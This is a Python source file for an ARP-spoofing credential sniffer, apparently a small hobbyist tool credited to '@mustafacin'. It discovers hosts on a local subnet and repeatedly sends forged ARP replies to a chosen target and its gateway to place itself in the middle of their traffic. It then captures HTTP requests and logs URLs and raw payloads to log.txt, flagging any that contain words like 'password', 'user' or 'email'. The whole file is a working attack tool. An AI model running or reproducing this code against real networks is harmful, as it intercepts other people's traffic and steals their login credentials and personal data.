#!/usr/bin/env python

import scapy.all as scapy
import time
from scapy.layers import http
import threading
import sys,os

basla = ("""    _                    ____        _  __  __           
   / \   _ __ _ __      / ___| _ __ (_)/ _|/ _| ___ _ __ 
  / _ \ | '__| '_ \ ____\___ \| '_ \| | |_| |_ / _ \ '__|
 / ___ \| |  | |_) |_____|__) | | | | |  _|  _|  __/ |   
/_/   \_\_|  | .__/     |____/|_| |_|_|_| |_|  \___|_|    @mustafacin
             |_|                                         
""")
print(basla)

def netdiscover_scan():
    ips = raw_input("Input your gateway (192.168.1.1): ")
    ip = ips + "/24"

    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1)[0]
    client_list = []

    for element in answered_list:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        client_list.append(client_dict)

    sayac = 0

    print("IP ADDRESS\t\tMAC ADDRESS\n--------------------------------------------")
    for sonuc in client_list:
        sayac = sayac+1
        print(str(sayac)+"\t"+sonuc["ip"]+"\t\t"+sonuc["mac"])

    degisken = raw_input("\nInput your target IP Address number (12): ")
    sayac = 1
    for sonuc in client_list:

        if str(sayac) == str(degisken):
            print("\nTarget IP Address : "+sonuc["ip"]+"\n")
            gonder = sonuc["ip"]
        sayac = sayac + 1

    return gonder,ips

def mac_find(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    for ans in range(0, len(answered_list)):
        mac1 = answered_list[0][1].hwsrc
        return mac1

def spoof(target_ip, spoof_ip):
    mac_adres = mac_find(spoof_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=mac_adres, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def sniff():
    interface = raw_input("Please login to your network interface (wlan0): ")
    print("\nPackets sniffing and writing logfile (log.txt)\n")
    scapy.sniff(iface=interface, store=False, prn=sniffed)

f = open("log.txt", "a+")

def sniffed(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("URL: "+str(url))
        f.write("URL: "+str(url))
        print("IP address / HOST : " + packet[scapy.IP].dst+"   /  "+packet[http.HTTPRequest].Host)
        f.write("IP address / HOST : " + packet[scapy.IP].dst+"   /  "+packet[http.HTTPRequest].Host)

 #       print(packet.show())

        if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            sinif = ["user", "password", "ad", "soyad", "user", "pass", "e-mail", "email"]
            for s1 in sinif:
                if s1 in load:
                    print("\n!!!! Secret WORDS : "+str(packet[scapy.Raw].load)+"\n")
                    f.write("\n!!!! Secret WORDS : "+str(packet[scapy.Raw].load)+"\n")
                else:
                    print("Raw data: "+str(load))
                    f.write("Raw data: " +str(load))

t = threading.Thread(name='sniff', target=sniff)

def main():

    hedef, ag_gecidi = netdiscover_scan()
    temp = 0
    while True:
        spoof(hedef, ag_gecidi)
        spoof(ag_gecidi, hedef)
        temp = temp + 2
        if str(temp) == "10":
            t.start()
        time.sleep(2)



if __name__ == "__main__":
    try:
        main()
    except  KeyboardInterrupt:
        print("\n\nCtrl + C and outting... \n")
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)

